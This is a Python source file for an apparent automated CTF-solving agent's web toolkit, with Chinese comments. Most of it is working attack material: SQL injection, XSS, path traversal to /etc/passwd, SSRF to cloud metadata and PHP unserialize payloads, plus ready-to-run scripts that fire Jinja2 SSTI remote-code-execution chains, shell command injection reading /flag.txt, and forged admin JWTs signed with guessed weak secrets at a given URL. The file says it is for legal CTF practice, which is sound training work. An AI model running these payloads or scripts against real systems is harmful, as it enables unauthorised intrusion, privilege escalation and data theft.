"""Web 领域工具包：payload 模板 + 工具链（主 Agent 按需调用）。

仅供 CTF 竞赛合法练习场景使用。提供：
- payload_templates：典型 Web 漏洞快速 payload（SQLi/XSS/上传/SSTI/反序列化等）
- suggest_steps：按题目描述/附件特征给出初始步骤建议（供主 Agent 参考，不强制）
"""

from __future__ import annotations

from typing import Optional


class WebToolkit:
    """Web 领域工具包。"""

    name = "web"
    tools = ["sqlmap_adapter", "http_client", "curl"]

    # 典型场景 payload 快速生成（辅助，非核心得分项）
    payload_templates: dict = {
        "sqli_login_bypass": [
            "' OR '1'='1' -- -",
            "' OR '1'='1'#",
            "admin' -- -",
            "' UNION SELECT 1,2,3 -- -",
        ],
        "sqli_extract": [
            "1' ORDER BY {n} -- -",          # 探测列数
            "1' UNION SELECT group_concat(table_name) FROM information_schema.tables -- -",
            "1' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' -- -",
        ],
        "xss_probe": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ],
        "ssti_probe": [
            "{{7*7}}",                          # Jinja2 探测
            "${7*7}",                           # Freemarker/EL 探测
            "{{config}}",                       # Jinja2 配置泄露
            "{% debug %}",                      # Django 调试
        ],
        "ssti_rce_jinja": [
            "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",  # 找 subprocess
        ],
        "upload_probe": [
            "shell.php",
            "shell.php.jpg",
            "shell.pHp",
            "shell.php%00.jpg",                # 空字节截断（老版本）
        ],
        "path_traversal": [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
        ],
        "unserialize_probe": [
            # PHP 反序列化：构造 __destruct 触发读 flag
            "O:5:\"Class\":1:{s:4:\"file\";s:9:\"/flag.txt\";}",
        ],
        "ssrf_probe": [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",   # 云元数据
            "file:///etc/passwd",
        ],
    }

    def suggest_steps(self, description: str, attachments: Optional[list] = None) -> list[str]:
        """按题目特征给出初始步骤建议（关键词匹配，粗粒度）。"""
        steps = ["使用 curl/requests 请求目标，观察响应头与页面结构"]
        desc = (description or "").lower()

        if any(k in desc for k in ("sql", "注入", "登录", "login")):
            steps += [
                "测试 SQL 注入：单引号探测闭合方式",
                "尝试万能密码绕过登录（payload_templates['sqli_login_bypass']）",
            ]
        if any(k in desc for k in ("ssti", "模板", "template", "{{")):
            steps += ["用 {{7*7}} 确认 Jinja2 注入，再尝试 RCE 链"]
        if any(k in desc for k in ("upload", "上传", "文件上传")):
            steps += ["探测上传点与文件类型校验，尝试绕过扩展名"]
        if any(k in desc for k in ("反序列化", "unserialize", "pop", "serialize")):
            steps += ["寻找反序列化入口参数（$_GET/$_POST/cookie），构造 POP 链"]
        if any(k in desc for k in ("遍历", "traversal", "下载", "download", "file")):
            steps += ["测试 download?file= 参数路径穿越读取 /flag.txt"]
        if not any(k in desc for k in
                   ("sql", "ssti", "upload", "反序列化", "unserialize", "遍历", "traversal", "download")):
            steps.append("先用目录扫描/源码查看定位漏洞入口（robots.txt、备份文件、JS 泄露）")
        return steps

    # ── 兜底发包脚本（原 main_agent 内联 payload 下架至此）──────────
    # 参数候选列表：不预设某个题库的专属参数名，逐个探测常见注入点

    _PROBE_PARAMS = ['cpass', 'password', 'input', 'query', 'name', 'cmd', 'code', 'template']

    _FALLBACK_SSTI = r'''
import httpx
url = __URL__
# SSTI 探测：{{7*7}} 逐参数尝试
for key in __PARAMS__:
    try:
        r = httpx.get(url, params={key: '{{7*7}}'}, timeout=10)
        if '49' in r.text:
            print('[ssti] param=%s 命中 {{7*7}} -> 49' % key)
        print('[ssti:%s] %s' % (key, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
# RCE payload 尝试（逐参数）
p = "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
for key in __PARAMS__:
    try:
        r2 = httpx.get(url, params={key: p}, timeout=10)
        print('[ssti-rce:%s] %s' % (key, r2.text[:300]))
    except Exception as e:
        print('req2 fail:', e)
'''

    _FALLBACK_UNSERIALIZE = r'''
import httpx, base64
url = __URL__
# 构造 __destruct 读取 flag 的序列化对象
obj = 'O:5:"Class":1:{s:4:"file";s:9:"/flag.txt";}'
data = base64.b64encode(obj.encode()).decode()
for key in ('data', 'token', 'input', 'file'):
    try:
        r = httpx.get(url, params={key: data}, timeout=10)
        print('[unserialize:%s] %s' % (key, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_JWT = r'''
import httpx, base64, json, hashlib, hmac
url = __URL__
# JWT 弱密钥爆破：先解码原 token 看 alg，再用常见密钥重签 admin
secrets = ['secret', 'password', 'admin', '123456', 'key', 'test', 'token', 'jwt', 'weak', 'changeme']
def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
header = b64url(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
payload = b64url(json.dumps({'user': 'admin', 'role': 'admin'}).encode())
for s in secrets:
    sig = hmac.new(s.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
    token = f'{header}.{payload}.{b64url(sig)}'
    try:
        r = httpx.get(url, headers={'Authorization': f'Bearer {token}'}, timeout=10)
        print('[jwt:%s] %s' % (s, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_CMD = r'''
import httpx
url = __URL__
# 命令注入尝试：;id / | cat /flag.txt / $(cat /flag.txt)
cmds = [';id', ';cat /flag.txt', '|cat /flag.txt', '$(cat /flag.txt)', ';cat${IFS}/flag.txt']
for c in cmds:
    for key in ('cmd', 'c', 'ip', 'input'):
        try:
            r = httpx.get(url, params={key: c}, timeout=10)
            print('[cmd:%s] %s' % (c, r.text[:300]))
        except Exception as e:
            print('req fail:', e)
'''

    _FALLBACK_BACKUP = r'''
import httpx
url = __URL__
# 备份文件探测：.bak / www.zip / .git / .swp
paths = ['index.php.bak', 'www.zip', 'backup.zip', 'flag.txt', '.git/HEAD',
         'index.php~', 'db.sql', 'flag.php.bak']
for p in paths:
    try:
        r = httpx.get(url.rstrip('/') + '/' + p, timeout=10)
        if r.status_code == 200:
            print('[backup:%s] %s' % (p, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_SQLI = r'''
import httpx
url = __URL__
# SQLi 万能密码尝试
for up in ["admin' OR '1'='1'--", "admin'--", "' OR '1'='1'#"]:
    for key in ('username', 'user', 'name', 'account'):
        try:
            r = httpx.get(url, params={key: up}, timeout=10)
            print('[sqli:%s/%s] %s' % (up, key, r.text[:300]))
        except Exception as e:
            print('req fail:', e)
'''

    @classmethod
    def build_fallback_script(cls, url: str, description: str = "") -> Optional[str]:
        """按描述提示的漏洞类型选择兜底发包脚本（模板统一在本工具包维护）。

        描述关键词是题目自带的提示（真实赛题描述即含漏洞方向），属合法信号；
        与 crypto/misc 的内容嗅探不同，web 的靶机行为只能发包探测。
        """
        if not url:
            return None
        desc = (description or "").lower()
        params = repr(cls._PROBE_PARAMS)
        if any(k in desc for k in ("ssti", "模板", "{{", "jinja", "tornado")):
            tpl = cls._FALLBACK_SSTI
        elif any(k in desc for k in ("反序列化", "unserialize", "serialize", "pop 链", "pop链", "魔术方法")):
            tpl = cls._FALLBACK_UNSERIALIZE
        elif any(k in desc for k in ("jwt", "弱密钥", "token 签名")):
            tpl = cls._FALLBACK_JWT
        elif any(k in desc for k in ("命令注入", "cmd", "命令执行", "参数拼接", "system")):
            tpl = cls._FALLBACK_CMD
        elif any(k in desc for k in ("备份", "泄露", "源码", ".bak", "备份文件")):
            tpl = cls._FALLBACK_BACKUP
        else:
            tpl = cls._FALLBACK_SQLI
        return tpl.replace("__URL__", repr(url)).replace("__PARAMS__", params)
